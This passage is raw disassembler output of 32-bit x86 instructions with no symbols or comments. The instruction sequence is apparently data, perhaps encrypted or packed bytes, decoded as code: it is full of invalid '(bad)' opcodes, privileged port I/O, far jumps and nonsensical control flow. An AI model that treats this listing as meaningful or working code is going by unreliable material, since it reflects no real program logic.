  409738:	cmp    ecx,edx
  40973a:	dec    edi
  40973b:	add    DWORD PTR [ebp+eax*2+0x33],0x40
  409740:	mov    edx,DWORD PTR [eax-0x1f57ef65]
  409746:	cmp    cl,BYTE PTR [edi+0x76]
  409749:	jns    0x4096cd
  40974b:	or     DWORD PTR [edx],ecx
  40974d:	mov    ah,0x1b
  40974f:	cmp    BYTE PTR ds:0x86e7509f,ah
  409755:	adc    bh,BYTE PTR [eax]
  409757:	mov    eax,0x82018684
  40975c:	xchg   ecx,eax
  40975d:	cmp    bh,bl
  40975f:	sbb    edi,DWORD PTR [eax+0x6b]
  409762:	dec    ebp
  409763:	imul   edx,DWORD PTR [edi+0xdc39fd2],0xffffff92
  40976a:	into   
  40976b:	mov    esp,0xb7b3eb85
  409770:	cwde   
  409771:	xchg   esi,eax
  409772:	clc    
  409773:	out    dx,eax
  409774:	sub    ecx,DWORD PTR [eax-0x156c45a]
  40977a:	bnd jno 0x4097f1
  40977d:	aam    0x9f
  40977f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409781:	enter  0x6c06,0xe8
  409785:	repz idiv DWORD PTR [edx]
  409788:	outs   dx,DWORD PTR ds:[esi]
  409789:	jmp    0xa301:0x15eaf882
  409790:	xchg   edx,eax
  409791:	xor    bh,ch
  409793:	xor    cl,BYTE PTR [eax]
  409795:	lea    ebx,[ebp-0x6e]
  409798:	fsubr  QWORD PTR [edi-0x5b]
  40979b:	sub    esi,DWORD PTR [ecx-0x2c]
  40979e:	dec    edi
  40979f:	mov    ecx,0xe220318b
  4097a4:	dec    ebx
  4097a5:	nop
  4097a6:	cdq    
  4097a7:	hlt    
  4097a8:	call   0x6729df63
  4097ad:	adc    bl,al
  4097af:	or     bh,BYTE PTR [edx-0x11]
  4097b2:	enter  0xe05d,0x1a
  4097b6:	mov    esi,0xa464b281
  4097bb:	mov    al,0xef
  4097bd:	add    eax,DWORD PTR [ecx-0x73]
  4097c0:	(bad)  
  4097c1:	neg    BYTE PTR [esp+edx*1+0x12]
  4097c5:	(bad)  
  4097c6:	mov    eax,ds:0xef69cee4
  4097cb:	ins    DWORD PTR es:[edi],dx
  4097cc:	nop
  4097cd:	dec    ebp
  4097ce:	adc    esi,DWORD PTR [edx-0x4c282cd6]
  4097d4:	retf   
  4097d5:	xchg   al,bl
  4097d7:	mov    esi,0xcbbb14b3
  4097dc:	xchg   esi,eax
  4097dd:	mov    dh,0x27
  4097df:	ss fwait
  4097e1:	sub    dl,al
  4097e3:	les    eax,FWORD PTR [ebp+edi*4-0x4a4f4681]
  4097ea:	sub    eax,ebx
  4097ec:	jb     0x409867
  4097ee:	push   ds
  4097ef:	lds    esi,FWORD PTR [edx-0x26]
  4097f2:	fist   WORD PTR [edx-0x46005385]
  4097f8:	test   al,0x8
  4097fa:	pop    esi
  4097fb:	arpl   WORD PTR fs:[edi+edx*2],si
  4097ff:	into   
  409800:	repnz mov al,0xc9
  409803:	out    0xbb,al
  409805:	pop    es
  409806:	mov    cl,0x89
  409808:	cmc    
  409809:	(bad)  
  40980a:	or     DWORD PTR ds:0xda63dc95,edi
  409810:	cmp    eax,0x4ba753c6
  409815:	dec    esi
  409816:	arpl   WORD PTR [edx+0x1b60bd0e],dx
  40981c:	xor    al,0x51
  40981e:	fwait
  40981f:	push   ecx
  409820:	jbe    0x40987d
  409822:	int    0x4f
  409824:	lahf   
  409825:	lods   al,BYTE PTR ds:[esi]
  409826:	sbb    esi,DWORD PTR [ebx+0x5b]
  409829:	outs   dx,DWORD PTR ds:[esi]
  40982a:	loop   0x4097ea
  40982c:	sub    ebp,DWORD PTR [edx]
  40982e:	arpl   cx,si
  409830:	mov    ch,0xb5
  409832:	div    DWORD PTR [edx+0x35]
  409835:	jg     0x4097f0
  409837:	lock cmp dl,BYTE PTR [esi+0x621935f0]
  40983e:	icebp  
  40983f:	adc    ch,BYTE PTR [edi+0x28]
  409842:	sub    al,BYTE PTR [ebp+eiz*8-0x5dbe47c2]
  409849:	(bad)  
  40984a:	jb     0x40984c
  40984c:	mov    edx,DWORD PTR [edi-0x48]
  40984f:	iret   
  409850:	mov    edx,?
  409852:	jle    0x40987c
  409854:	lea    ebx,[edx+edi*8-0x4014cc72]
  40985b:	push   0x8aa59af4
  409860:	rol    edi,cl
  409862:	xchg   esi,eax
  409863:	popa   
  409864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409865:	or     eax,0xd93772a6
  40986a:	dec    edx
  40986b:	xchg   ebp,eax
  40986c:	hlt    
  40986d:	mul    BYTE PTR [esi-0x6b]
  409870:	jmp    0xe571:0x9e9c04bd
  409877:	(bad)  
  409878:	dec    esp
  409879:	shl    dh,0x91
  40987c:	stos   BYTE PTR es:[edi],al
  40987d:	mov    bh,0x78
  40987f:	mov    BYTE PTR [edx+edx*8],ah
  409882:	adc    eax,0x196e7747
  409887:	mov    eax,DWORD PTR [esi-0x1c]
  40988a:	jmp    0x4098c0
  40988c:	ja     0x409896
  40988e:	mov    eax,0x2869ae42
  409893:	mov    ebx,0x1db7c1d8
  409898:	xchg   esi,eax
  409899:	jmp    0x409885
  40989b:	add    ah,BYTE PTR [ebx]
  40989d:	mov    esi,0x688929c2
  4098a2:	push   edx
  4098a3:	fwait
  4098a4:	imul   eax,DWORD PTR [edi-0x1e],0x11
  4098a8:	jno    0x409889
  4098aa:	and    al,0xd6
  4098ac:	push   ds
  4098ad:	cmp    DWORD PTR [edx+0x4228196d],0x68
  4098b4:	loope  0x409839
  4098b6:	adc    ah,cl
  4098b8:	ret    
  4098b9:	ret    
  4098ba:	push   cs
  4098bb:	jp     0x4098d6
  4098bd:	loope  0x409845
  4098bf:	jmp    0x409858
  4098c1:	sbb    BYTE PTR [ebx],dh
  4098c3:	xchg   DWORD PTR [eax-0x3975a97c],ebp
  4098c9:	test   eax,0x7aee56cb
  4098ce:	add    BYTE PTR [ecx+eax*8+0x46],ah
  4098d2:	jg     0x409941
  4098d4:	loope  0x409949
  4098d6:	jge    0x409954
  4098d8:	add    bh,BYTE PTR [esi+0x4e571ea6]
  4098de:	aaa    
  4098df:	mov    DWORD PTR [edi+0x1599af12],esp
  4098e5:	aaa    
  4098e6:	add    al,0x86
  4098e8:	addr16 (bad) 
  4098ea:	xor    esi,esp
  4098ec:	and    ebx,DWORD PTR [ebp-0x2a]
  4098ef:	mov    eax,ds:0xc52842e2
  4098f4:	out    0xcc,al
  4098f6:	inc    ebx
  4098f7:	fimul  WORD PTR [eax+0x38]
  4098fa:	ret    0x1c16
  4098fd:	pop    edi
  4098fe:	repz cld 
  409900:	mov    dl,0x67
  409902:	mov    edi,DWORD PTR ds:0xb7fc6035
  409908:	arpl   WORD PTR [esi],cx
  40990a:	push   ss
  40990b:	test   eax,0xa5d13feb
  409910:	or     eax,0x1b896c54
  409915:	fsub   st(5),st
  409917:	repnz shr ah,cl
  40991a:	cmp    dl,BYTE PTR [edi+0x47]
  40991d:	stc    
  40991e:	mov    dl,0xbd
  409920:	popf   
  409921:	fs sbb esi,eax
  409924:	pop    esp
  409925:	sar    ebp,0x75
  409928:	retf   0x35e0
  40992b:	cld    
  40992c:	pop    edx
  40992d:	into   
  40992e:	pop    ax
  409930:	out    dx,al
  409931:	sub    bl,dh
  409933:	(bad)  
  409934:	(bad)  
  409936:	mov    esi,0xa9c8fc3a
  40993b:	pop    edi
  40993c:	adc    bl,BYTE PTR [edi+0x73]
  40993f:	test   DWORD PTR [ebp+0x443bfb9e],edx
  409945:	imul   edx,ecx,0x56aaa55f
  40994b:	add    edx,ebp
  40994d:	push   cs
  40994e:	or     al,dh
  409950:	(bad)  
  409951:	daa    
  409952:	jp     0x409952
  409954:	cld    
  409955:	popf   
  409956:	(bad)  
  409957:	mov    ebx,0xd450a8f8
  40995c:	lods   eax,DWORD PTR ds:[esi]
  40995d:	xchg   edx,eax
  40995e:	out    0x6d,eax
  409960:	push   edi
  409961:	sub    eax,0xc415c64f
  409966:	push   0x9889ae20
  40996b:	mov    ebx,0x2b5ad754
  409970:	pop    ebp
  409971:	fidivr DWORD PTR [eax-0x244a1907]
  409977:	mov    edx,0xdc7df4fc
  40997c:	jae    0x409950
  40997e:	fbstp  TBYTE PTR [ecx-0x2e243834]
  409984:	iret   
  409985:	sub    BYTE PTR [edi+0x73050218],dh
  40998b:	dec    esp
  40998c:	lock mov ecx,esp
  40998f:	pop    ecx
  409990:	xchg   edx,eax
  409991:	xchg   BYTE PTR [eax],ah
  409993:	mov    ebx,0xfff42a6d
  409998:	xlat   BYTE PTR ds:[ebx]
  409999:	mov    ch,0xa4
  40999b:	and    ch,BYTE PTR [esi+edx*4-0x2f]
  40999f:	xchg   edx,eax
  4099a0:	and    BYTE PTR [esi+0x4d93cb7f],0x7c
  4099a7:	and    bh,BYTE PTR [edx+0x15]
  4099aa:	test   DWORD PTR [esp+eiz*4-0x2e],0xca168de
  4099b2:	sbb    eax,DWORD PTR [ecx]
  4099b4:	pop    eax
  4099b5:	mov    edi,esi
  4099b7:	call   0x730f:0xc28d11ac
  4099be:	mov    al,ds:0x10042f14
  4099c3:	adc    dl,BYTE PTR [eax+edx*1+0x7]
  4099c7:	push   ebp
  4099c8:	mov    al,ds:0x7dacd2b2
  4099cd:	xor    ecx,eax
  4099cf:	push   edi
  4099d0:	xchg   esp,eax
  4099d1:	ja     0x409a39
  4099d3:	mov    eax,0xb2e55357
  4099d8:	add    al,0xb8
  4099da:	add    DWORD PTR [ebx],ebx
  4099dc:	xchg   esp,eax
  4099dd:	jmp    0x40997d
  4099df:	into   
  4099e0:	dec    esp
  4099e1:	mov    BYTE PTR [ebx],dh
  4099e3:	or     eax,0xda1254aa
  4099e8:	retf   0x6ef0
  4099eb:	or     DWORD PTR [ecx+0x6f],ecx
  4099ee:	scas   al,BYTE PTR es:[edi]
  4099ef:	(bad)  
  4099f0:	pop    edi
  4099f1:	ins    DWORD PTR es:[edi],dx
  4099f2:	hlt    
  4099f3:	xor    ah,BYTE PTR [edi]
  4099f5:	test   BYTE PTR [ecx-0x63],cl
  4099f8:	fisub  DWORD PTR ds:0xb73fa09b
  4099fe:	enter  0x9a5a,0xdb
  409a02:	cmp    DWORD PTR [ebx-0x5b098038],ecx
  409a08:	pop    eax
  409a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0a:	adc    dl,al
  409a0c:	push   es
  409a0d:	dec    esi
  409a0e:	pop    ds
  409a0f:	imul   edi,DWORD PTR [eax-0x669ef962],0xac56d1a2
  409a19:	je     0x4099cd
  409a1b:	fucom  st(6)
  409a1d:	nop
  409a1e:	cmp    ebx,eax
  409a20:	add    BYTE PTR ds:0xfca2ae9e,bl
  409a26:	xchg   ebp,eax
  409a27:	retf   0xfeb9
  409a2a:	rol    BYTE PTR [edi],cl
  409a2c:	mov    ds:0x225005f9,al
  409a31:	xor    ecx,esp
  409a33:	dec    esp
  409a34:	popf   
  409a35:	lods   eax,DWORD PTR ds:[esi]
  409a36:	mov    dh,bl
  409a38:	out    dx,eax
  409a39:	sbb    dh,BYTE PTR [eax+ebp*8+0x1d451d93]
  409a40:	gs adc al,0x6f
  409a43:	ret    
  409a44:	add    esi,DWORD PTR [edi+edx*4]
  409a47:	loope  0x409a1a
  409a49:	and    eax,0xf4c79c67
  409a4e:	mov    edx,0x7ea0bb5c
  409a53:	mov    al,ds:0x974d8c06
  409a58:	jecxz  0x409a99
  409a5a:	das    
  409a5b:	push   esp
  409a5c:	cli    
  409a5d:	fwait
  409a5e:	pop    ecx
  409a5f:	pop    ebx
  409a60:	in     al,dx
  409a61:	std    
  409a62:	sbb    BYTE PTR [edi+0x5561233f],ch
  409a68:	fimul  WORD PTR [eax+ecx*2+0x7bdaa50d]
  409a6f:	inc    ebx
  409a70:	add    eax,0x73287c36
  409a75:	pop    ecx
  409a76:	xchg   ebx,eax
  409a77:	push   cs
  409a78:	sbb    bh,al
  409a7a:	and    BYTE PTR [ecx-0x68],ah
  409a7d:	(bad)  
  409a7e:	or     eax,0x7f9ecbd6
  409a83:	test   al,0x8a
  409a85:	imul   eax,DWORD PTR [edx],0xffffffb9
  409a88:	jmp    0x92c74d1c
  409a8d:	fistp  QWORD PTR [ecx+0x65f87f9d]
  409a93:	pop    di
  409a95:	push   ebp
  409a96:	in     eax,0x90
  409a98:	push   0xffffffc5
  409a9a:	xchg   ebp,eax
  409a9b:	push   ecx
  409a9c:	scas   al,BYTE PTR es:[edi]
  409a9d:	sbb    bl,bl
  409a9f:	inc    esi
  409aa0:	dec    ebp
  409aa1:	push   0xf8439847
  409aa6:	xor    al,0x8d
  409aa8:	(bad)  
  409aa9:	int    0x3e
  409aab:	out    0x63,eax
  409aad:	sub    edi,DWORD PTR [edi-0x6e]
  409ab0:	sbb    al,0x47
  409ab2:	bound  eax,QWORD PTR [eax-0x4c]
  409ab5:	cs arpl cx,di
  409ab8:	fldcw  WORD PTR [ecx+0x69a47bfb]
  409abe:	jle    0x409b07
  409ac0:	es je  0x409a60
  409ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ac4:	cmc    
  409ac5:	out    dx,al
  409ac6:	ins    DWORD PTR es:[edi],dx
  409ac7:	sub    edx,DWORD PTR [ebp-0x6f56d64a]
  409acd:	jl     0x409ab5
  409acf:	pop    ecx
  409ad0:	hlt    
  409ad1:	xlat   BYTE PTR ds:[ebx]
  409ad2:	scas   al,BYTE PTR es:[edi]
  409ad3:	or     al,0x9d
  409ad5:	mov    eax,ds:0xb4249b67
  409ada:	fild   WORD PTR [ebp*8+0x46c0c874]
  409ae1:	call   0x24ba:0x55a8ea70
  409ae8:	add    DWORD PTR [edx],edi
  409aea:	fsubr  DWORD PTR [ecx]
  409aec:	adc    esi,DWORD PTR [esi]
  409aee:	sub    cl,BYTE PTR [ebx]
  409af0:	mov    esi,0x70bab70c
  409af5:	dec    ecx
  409af6:	push   ss
  409af7:	xchg   ebx,eax
  409af8:	sbb    bl,BYTE PTR [esi]
  409afa:	aas    
  409afb:	icebp  
  409afc:	mov    ebp,0x4cecea41
  409b01:	lea    eax,[esi+0x45f0a2b3]
  409b07:	out    dx,eax
  409b08:	inc    esi
  409b09:	btr    DWORD PTR [ebp-0x5b],0x6d
  409b0e:	mov    esi,0xe2e87fab
  409b13:	or     ebx,esi
  409b15:	push   ebx
  409b16:	ins    DWORD PTR es:[edi],dx
  409b17:	retf   
  409b18:	sub    ch,BYTE PTR [ebp+0x56]
  409b1b:	test   DWORD PTR [eax+0x78c7b282],ebp
  409b21:	aas    
  409b22:	inc    esp
  409b23:	push   0xffffffc2
  409b25:	inc    ebp
  409b26:	dec    esi
  409b27:	out    0x97,al
  409b29:	fcom   QWORD PTR [ebx+0x77]
  409b2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b2d:	(bad)  [edi+0x6a49a27a]
  409b33:	ror    DWORD PTR [esi-0x4],cl
  409b36:	loop   0x409ad7
  409b38:	xlat   BYTE PTR ds:[ebx]
  409b39:	in     al,dx
  409b3a:	inc    edx
  409b3b:	pop    ebx
  409b3c:	sbb    eax,0x86e29be
  409b41:	adc    DWORD PTR [eax+0x1e],esi
  409b44:	push   ebp
  409b45:	sbb    ebx,esp
  409b47:	fbstp  TBYTE PTR [eax-0x6c]
  409b4a:	test   BYTE PTR [ebx],bl
  409b4c:	loopne 0x409b14
  409b4e:	mov    BYTE PTR [edx-0x15],0x9e
  409b52:	sar    BYTE PTR [esi+eiz*1],1
  409b55:	leave  
  409b56:	(bad)  
  409b57:	fwait
  409b58:	repz pop esp
  409b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b5b:	leave  
  409b5c:	push   ds
  409b5d:	and    esi,edi
  409b5f:	cs loop 0x409b8b
  409b62:	dec    edx
  409b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b64:	push   0x6a63c573
  409b69:	sub    edi,eax
  409b6b:	and    eax,0x7805e943
  409b70:	or     eax,eax
  409b72:	das    
  409b73:	mov    ebx,0xd6d995d2
  409b78:	fs aam 0x84
  409b7b:	or     DWORD PTR [eax+esi*2],0x8e332737
  409b82:	sti    
  409b83:	mul    ecx
  409b85:	xor    edx,edi
  409b87:	(bad)  
  409b88:	fcom   QWORD PTR [esi+0x112ac00e]
  409b8e:	cmp    cl,BYTE PTR [ecx]
  409b90:	push   ebp
  409b91:	pop    esi
  409b92:	stos   BYTE PTR es:[edi],al
  409b93:	pop    esp
  409b94:	mov    ecx,0x386ca9b2
  409b99:	and    esp,esi
  409b9b:	xlat   BYTE PTR ds:[ebx]
  409b9c:	jmp    0xf48adc56
  409ba1:	adc    al,0x16
  409ba3:	mov    al,ds:0x62a33762
  409ba8:	or     eax,0x7a9db43e
  409bad:	adc    dl,bh
  409baf:	push   cs
  409bb0:	cdq    
  409bb1:	cmp    BYTE PTR [ebp-0x39],0x38
  409bb5:	mov    ebp,DWORD PTR [edi]
  409bb7:	and    eax,0xc24bb2f2
  409bbc:	xor    DWORD PTR [esi-0x20ed5c9f],0x3b
  409bc3:	ss mov edx,0xb1030736
  409bc9:	xchg   ebx,eax
  409bca:	test   al,0x18
  409bcc:	in     al,dx
  409bcd:	outs   dx,BYTE PTR ds:[esi]
  409bce:	sar    BYTE PTR [ebx+0x89667db],cl
  409bd4:	shl    DWORD PTR [eax],0xf6
  409bd7:	xor    al,0x22
  409bd9:	mov    al,ds:0x98c705e8
  409bde:	out    dx,al
  409bdf:	out    dx,eax
  409be0:	in     eax,dx
  409be1:	ins    BYTE PTR es:[edi],dx
  409be2:	fmul   QWORD PTR [edi+0x37]
  409be5:	pop    eax
  409be6:	pop    ebp
  409be7:	or     cl,BYTE PTR [edx+0x17149ca1]
  409bed:	pop    ebp
  409bee:	and    ebp,DWORD PTR ds:0xfb1eb30a
  409bf4:	pop    ss
  409bf5:	les    ebx,FWORD PTR [esi-0x78]
  409bf8:	inc    esp
  409bf9:	push   esi
  409bfa:	ror    DWORD PTR [ebx],0xe2
  409bfd:	ins    DWORD PTR es:[edi],dx
  409bfe:	xor    al,0xd3
  409c00:	or     ebx,ebx
  409c02:	xchg   edx,eax
  409c03:	add    DWORD PTR [ebx],edx
  409c05:	outs   dx,BYTE PTR ds:[esi]
  409c06:	pop    edi
  409c07:	inc    esi
  409c08:	js     0x409c68
  409c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c0b:	pop    ebx
  409c0c:	xor    WORD PTR [eax+0x5ef53139],si
  409c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c14:	and    al,0xf0
  409c16:	mov    cl,0xee
  409c18:	mov    bh,0x85
  409c1a:	mov    eax,0x3dfa8585
  409c1f:	(bad)  
  409c21:	adc    al,0xc1
  409c23:	nop
  409c24:	lock pushf 
  409c26:	jae    0x409bca
  409c28:	icebp  
  409c29:	mov    edx,0xf2239af4
  409c2e:	mov    WORD PTR [edi+0x413d450],ds
  409c34:	dec    eax
  409c35:	(bad)  cs:[ebx-0x2d]
  409c39:	jnp    0x409c26
  409c3b:	mov    cs,WORD PTR [esi+0x11d3a2fa]
  409c41:	add    bl,ch
  409c43:	push   ss
  409c44:	shr    BYTE PTR [esi+0x49eb9940],1
  409c4a:	(bad)
  409c4e:	inc    esp
  409c4f:	shl    BYTE PTR [ebp-0x535bf7d6],0x71
  409c56:	retf   0x123d
  409c59:	mov    cs,WORD PTR [edx]
  409c5b:	xchg   esp,eax
  409c5c:	mov    esi,0x7e8d19e5
  409c61:	jle    0x409c97
  409c63:	xchg   esp,eax
  409c64:	(bad)  
  409c65:	cmp    DWORD PTR [ebp+0x170a5b60],ecx
  409c6b:	repz inc esp
  409c6d:	inc    eax
  409c6e:	test   al,0x97
  409c70:	ret    0xd745
  409c73:	mov    edi,0x3915ec21
  409c78:	sub    BYTE PTR [ecx-0x3964b81e],bh
  409c7e:	mov    cl,BYTE PTR [eax+0x37c35138]
  409c84:	lea    ebp,[edi]
  409c86:	aaa    
  409c87:	dec    esi
  409c88:	call   0x6c0d:0x238a89ac
  409c8f:	and    DWORD PTR [edi+0x664f2513],edi
  409c95:	(bad)  
  409c96:	jbe    0x409c35
  409c98:	adc    al,0xdb
  409c9a:	test   eax,0x2b820de4
  409c9f:	adc    al,0xea
  409ca1:	adc    ah,dl
  409ca3:	es jg  0x409c7f
  409ca6:	test   al,0xc0
  409ca8:	cs repz sahf 
  409cab:	dec    ebx
  409cac:	test   DWORD PTR [eax-0x3a5f8352],0xc112c626
  409cb6:	sti    
  409cb7:	xlat   BYTE PTR ds:[ebx]
  409cb8:	stc    
  409cb9:	adc    eax,0x3930da38
  409cbe:	leave  
  409cbf:	sti    
  409cc0:	cwde   
  409cc1:	xor    bl,BYTE PTR [ecx]
  409cc3:	arpl   bx,bp
  409cc5:	or     eax,0xed2d878e
  409cca:	jle    0x409c71
  409ccc:	add    esp,edx
  409cce:	rcr    dl,0xe
  409cd1:	retf   0x7028
  409cd4:	aaa    
  409cd5:	adc    DWORD PTR [eax+esi*4+0x7f],0xffffffaf
  409cda:	mov    WORD PTR [ebp-0x629ba617],?
  409ce0:	pop    ecx
  409ce1:	ins    DWORD PTR es:[edi],dx
  409ce2:	pop    ecx
  409ce3:	pop    edi
  409ce4:	out    dx,eax
  409ce5:	out    dx,eax
  409ce6:	repnz pop ds
  409ce8:	sbb    ch,BYTE PTR cs:[ecx]
  409ceb:	pop    eax
  409cec:	or     ah,BYTE PTR [edx+ebx*2+0x9f67faf]
  409cf3:	pop    ebp
  409cf4:	cmp    BYTE PTR [ebp+0x12],0x2a
  409cf8:	mov    DWORD PTR [eax+ebx*1],esi
  409cfb:	push   ds
  409cfc:	add    BYTE PTR [ebx-0x1f0b7ef5],al
  409d02:	or     al,0x1b
  409d04:	or     al,0xa2
  409d06:	sub    DWORD PTR [edi-0x30],0x5b1653c3
  409d0d:	mov    bh,BYTE PTR [edi]
  409d0f:	mov    esp,DWORD PTR [edi+0x4cad662c]
  409d15:	add    al,0x80
  409d17:	pop    ecx
  409d18:	xlat   BYTE PTR ds:[ebx]
  409d19:	jp     0x409cdf
  409d1b:	aaa    
  409d1c:	aad    0x93
  409d1e:	and    dl,BYTE PTR [eax-0x5c9c42c3]
  409d24:	xor    eax,DWORD PTR ds:0x7cd48433
  409d2a:	push   eax
  409d2b:	adc    BYTE PTR [ebx+0x1b],dh
  409d2e:	push   es
  409d2f:	xlat   BYTE PTR ds:[ebx]
  409d30:	adc    BYTE PTR [eax-0x2f],dl
  409d33:	repz push cs
  409d35:	cmc    
  409d36:	pop    edi
  409d37:	pushf  
  409d38:	ds cmc 
  409d3a:	jae    0x409da9
  409d3c:	push   eax
  409d3d:	shl    DWORD PTR [eax+0x797e0db0],0xa8
  409d44:	inc    ebx
  409d45:	das    
  409d46:	sbb    BYTE PTR [edx-0x2d],bh
  409d49:	push   ebp
  409d4a:	mov    ds:0xde1bb1b6,eax
  409d4f:	stos   BYTE PTR es:[edi],al
  409d50:	scas   eax,DWORD PTR es:[edi]
  409d51:	and    al,0x65
  409d53:	dec    esi
  409d54:	gs push ss
  409d56:	cmp    al,0x3b
  409d58:	int3   
  409d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d5a:	sub    BYTE PTR [ecx-0x2d],bl
  409d5d:	sahf   
  409d5e:	cmp    edi,edi
  409d60:	mov    ds:0x2bd1948a,al
  409d65:	lock mov dh,0xa9
  409d68:	sub    BYTE PTR [ecx-0x5f7a68f6],ch
  409d6e:	mov    esi,0xf73a8f1c
  409d73:	icebp  
  409d74:	cmp    DWORD PTR [edi+0x76d44fff],ecx
  409d7a:	es out 0x93,al
  409d7d:	ja     0x409d49
  409d7f:	sahf   
  409d80:	mov    al,0x5a
  409d82:	(bad)  
  409d83:	fcomip st,st(7)
  409d85:	jle    0x409d6b
  409d87:	mov    al,BYTE PTR [eax+0x71]
  409d8a:	out    dx,al
  409d8b:	sbb    eax,0xbeec8ca2
  409d90:	ret    
  409d91:	xlat   BYTE PTR ds:[ebx]
  409d92:	dec    ecx
  409d93:	cli    
  409d94:	ret    
  409d95:	out    0x6b,al
  409d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d98:	cmp    al,0xfc
  409d9a:	mov    bh,0xde
  409d9c:	dec    ebx
  409d9d:	or     al,0x13
  409d9f:	shl    DWORD PTR [ecx+esi*4],cl
  409da2:	xchg   edx,eax
  409da3:	push   0x55
  409da5:	inc    esi
  409da6:	cli    
  409da7:	arpl   WORD PTR [ebx+edi*1-0x63c5a177],ax
  409dae:	and    DWORD PTR [ebx+0x5f],ecx
  409db1:	repnz cmp eax,0xad5a4a1a
  409db7:	loop   0x409e30
  409db9:	add    DWORD PTR [edx+0x6e],eax
  409dbc:	stc    
  409dbd:	call   0x8e9e:0x77ed12fc
  409dc4:	test   al,0x29
  409dc6:	sbb    edx,esp
  409dc8:	loopne 0x409db9
  409dca:	push   ds
  409dcb:	stos   BYTE PTR es:[edi],al
  409dcc:	std    
  409dcd:	aas    
  409dce:	push   ebx
  409dcf:	mov    dl,0x8b
  409dd1:	int    0x88
  409dd3:	sub    BYTE PTR [ecx-0xc3a7d65],dl
  409dd9:	scas   al,BYTE PTR es:[edi]
  409dda:	push   eax
  409ddb:	test   eax,0xeac93af0
  409de0:	mov    eax,ds:0xcf5f7620
  409de5:	fisttp QWORD PTR ds:0x52c13227
  409deb:	jle    0x409d7f
  409ded:	(bad)  
  409dee:	shr    BYTE PTR [ebp-0x43],0xb3
  409df2:	mov    ds:0xa10279a2,al
  409df7:	mov    al,ds:0x6c8b2609
  409dfc:	out    dx,al
  409dfd:	js     0x409df7
  409dff:	js     0x409e07
  409e01:	pop    ecx
  409e02:	jmp    0xb0586dab
  409e07:	mov    dh,0xc7
  409e09:	je     0x409d96
  409e0b:	sub    eax,DWORD PTR [ebp+0x74]
  409e0e:	pusha  
  409e0f:	jo     0x409e65
  409e11:	fistp  QWORD PTR [edi-0x8]
  409e14:	rcr    DWORD PTR [eax-0x34],0x85
  409e18:	pushf  
  409e19:	sub    eax,eax
  409e1b:	xchg   esp,eax
  409e1c:	push   ecx
  409e1d:	stos   DWORD PTR es:[edi],eax
  409e1e:	rcl    BYTE PTR [eax+0x20ac1141],cl
  409e24:	lahf   
  409e25:	in     eax,dx
  409e26:	test   eax,0xdff43f7a
  409e2b:	rol    dl,cl
  409e2d:	inc    ecx
  409e2e:	push   esp
  409e2f:	push   0x3f33dbb1
  409e34:	test   DWORD PTR [ecx+0x21],esp
  409e37:	mov    cl,ch
  409e39:	cld    
  409e3a:	scas   al,BYTE PTR es:[edi]
  409e3b:	ficom  DWORD PTR [esi+0x167d4ec7]
  409e41:	push   eax
  409e42:	mov    ebp,0x179c5465
  409e47:	mov    ah,0xa5
  409e49:	scas   al,BYTE PTR es:[edi]
  409e4a:	nop
  409e4b:	mov    al,0xf
  409e4d:	jns    0x409e09
  409e4f:	xor    cl,cl
  409e51:	and    eax,0x8debdae6
  409e56:	cmp    DWORD PTR [edi-0x518f0234],edi
  409e5c:	sbb    eax,0x2f5f9598
  409e61:	nop
  409e62:	shl    BYTE PTR [eax+0x4edd5f5e],cl
  409e68:	mov    ss,WORD PTR [esi+0x0]
  409e6b:	ss daa 
  409e6d:	push   0x21366896
  409e72:	sub    ah,BYTE PTR [esi]
  409e74:	xchg   ebx,eax
  409e75:	or     BYTE PTR [ebp-0x60777d0e],dh
  409e7b:	adc    al,0xc9
  409e7d:	sbb    eax,DWORD PTR [ecx]
  409e7f:	test   DWORD PTR [ebp-0x55],0xb464eee8
  409e86:	shl    BYTE PTR [ecx+0x34f15f16],cl
  409e8c:	es xor eax,0x9f1c2ffe
  409e92:	xchg   ebp,eax
  409e93:	test   al,0xf8
  409e95:	xchg   ecx,eax
  409e96:	(bad)  [esi+0x3]
  409e99:	jbe    0x409eb3
  409e9b:	xor    eax,0x2bbe2d06
  409ea0:	pop    esp
  409ea1:	dec    ebp
  409ea2:	mov    ds:0xdeee3dac,al
  409ea7:	pop    esi
  409ea8:	jmp    0x8d52e8b8
  409ead:	cld    
  409eae:	bnd jbe 0x409eb7
  409eb1:	inc    edi
  409eb2:	mov    bl,0x8d
  409eb4:	and    DWORD PTR [edi+0x1816c390],edx
  409eba:	xchg   edi,eax
  409ebb:	daa    
  409ebc:	mul    cl
  409ebe:	jecxz  0x409e6a
  409ec0:	xor    al,0xc4
  409ec2:	imul   ecx,DWORD PTR [edi+0x374dc880],0x7e
  409ec9:	ds sbb ebp,edi
  409ecc:	retf   0xab4d
  409ecf:	cwde   
  409ed0:	cmc    
  409ed1:	pop    es
  409ed2:	mov    ah,0xb
  409ed4:	and    ebp,DWORD PTR [ebx+0x38]
  409ed7:	pop    edx
  409ed8:	call   0xb9d4f8b1
  409edd:	and    al,0x6a
  409edf:	out    0x5d,eax
  409ee1:	es out 0xaf,eax
  409ee4:	dec    eax
  409ee5:	push   esp
  409ee6:	dec    eax
  409ee7:	shr    bl,1
  409ee9:	inc    eax
  409eea:	lahf   
  409eeb:	xlat   BYTE PTR ds:[ebx]
  409eec:	shl    DWORD PTR [eax-0x17],cl
  409eef:	mov    esp,0x7a051594
  409ef4:	mov    dl,0x1b
  409ef6:	jmp    0xe126:0xe18d9f46
  409efd:	es mov esp,0x6ca0a07e
  409f03:	cmp    eax,0x6cb8e839
  409f08:	lods   eax,DWORD PTR fs:[esi]
  409f0a:	scas   al,BYTE PTR es:[edi]
  409f0b:	mov    WORD PTR [ecx+0x39],ss
  409f0e:	mov    ch,0x6f
  409f10:	add    al,0x6b
  409f12:	stos   DWORD PTR es:[edi],eax
  409f13:	out    dx,al
  409f14:	inc    edx
